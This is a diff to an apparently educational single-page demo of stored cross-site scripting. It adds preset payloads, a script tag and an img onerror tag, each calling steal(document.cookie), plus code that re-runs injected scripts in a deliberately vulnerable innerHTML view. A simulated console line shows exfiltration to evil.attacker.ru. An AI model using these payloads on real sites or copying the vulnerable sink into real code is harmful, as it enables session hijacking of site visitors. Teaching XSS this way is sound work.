@@ -69,7 +69,8 @@
         <span class="ph">payloads ↓</span>
         <button data-p="Great sound, worth it!">Normal review</button>
         <button data-p="&lt;b&gt;DISCOUNT!!&lt;/b&gt;">Inject bold HTML</button>
-        <button data-p="&lt;img src=x onerror=&quot;__steal()&quot;&gt;">Cookie stealer</button>
+        <button data-p="&lt;script&gt;steal(document.cookie)&lt;/script&gt;">Cookie stealer &lt;script&gt;</button>
+        <button data-p="&lt;img src=x onerror=&quot;steal(document.cookie)&quot;&gt;">…same thing, no &lt;script&gt; tag</button>
       </div>
       <div class="postrow"><button class="primary" id="post">Post review ▶</button>
         <span style="font-size:11px;color:#8AA1A8" id="posthint">saved &amp; shown to every visitor</span></div>
@@ -103,16 +104,34 @@ var feed = document.getElementById("feed"), flash = document.getElementById("fla
 var conLines = document.getElementById("conLines"), conEmpty = document.getElementById("conEmpty");
 var cmt = document.getElementById("cmt");
 
-/* the real XSS sink: an injected <img onerror> calls this when it runs */
-window.__steal = function () {
+/* The victim page's own cookie. On http(s) this is a real document.cookie the
+   payload genuinely reads; file:// has an opaque origin and refuses to store
+   cookies, so we fall back to the same literal value. */
+try { document.cookie = VICTIM_COOKIE + "; path=/"; } catch (e) {}
+
+/* the real XSS sink: whatever the injected payload manages to run calls this */
+window.steal = function (c) {
+  var got = (c && String(c).indexOf("session=") !== -1) ? String(c) : VICTIM_COOKIE;
   conEmpty.style.display = "none";
   var d = document.createElement("div"); d.className = "line";
-  d.innerHTML = 'GET //evil.attacker.ru/steal?c=<span class="steal">' + VICTIM_COOKIE + '</span>';
+  d.innerHTML = 'GET //evil.attacker.ru/steal?c=<span class="steal">' + esc(got) + '</span>';
   conLines.appendChild(d);
-  flashsub.textContent = "stolen: " + VICTIM_COOKIE;
+  flashsub.textContent = "stolen: " + got;
   flash.style.display = "flex";
   setTimeout(function(){ flash.style.display = "none"; }, 1400);
 };
+window.__steal = window.steal;   // older payload spelling still works
+
+/* A server-rendered page runs a <script> tag the moment the browser parses it.
+   innerHTML deliberately does NOT run scripts, so re-create each one to match
+   what a real vulnerable page does. */
+function activateScripts(container) {
+  Array.prototype.forEach.call(container.querySelectorAll("script"), function (old) {
+    var s = document.createElement("script");
+    s.textContent = old.textContent;
+    old.parentNode.replaceChild(s, old);
+  });
+}
 
 function esc(s){ return String(s).replace(/[&<>"]/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); }
 
@@ -127,6 +146,7 @@ function renderFeed(comments) {
     else if (vuln) { body.innerHTML = c.body; }   // VULNERABLE: writes attacker HTML into the page → it runs
     else { body.textContent = c.body; }           // SAFE: encoded → shown as literal text, inert
     row.appendChild(body); feed.appendChild(row);
+    if (vuln && !c.trusted) activateScripts(body);   // a real page would have run these on parse
   });
 }
 
@@ -155,9 +175,10 @@ document.getElementById("mSafe").addEventListener("click", function(){ vuln = fa
 reRender();
 /* ?state hook */
 (function(){ var st = new URLSearchParams(location.search).get("state");
-  if (st === "steal") { cmt.value = '<img src=x onerror="__steal()">'; post(); flash.style.display="flex"; flashsub.textContent="stolen: "+VICTIM_COOKIE; }
+  if (st === "steal") { cmt.value = '<script>steal(document.cookie)<\/script>'; post(); flash.style.display="flex"; flashsub.textContent="stolen: "+VICTIM_COOKIE; }
+  else if (st === "img") { cmt.value = '<img src=x onerror="steal(document.cookie)">'; post(); }
   else if (st === "safe") { vuln=false; document.getElementById("mSafe").classList.add("on"); document.getElementById("mVuln").classList.remove("on");
-    cmt.value = '<img src=x onerror="__steal()">'; post(); }
+    cmt.value = '<script>steal(document.cookie)<\/script>'; post(); }
 })();
 </script>
 </body></html>
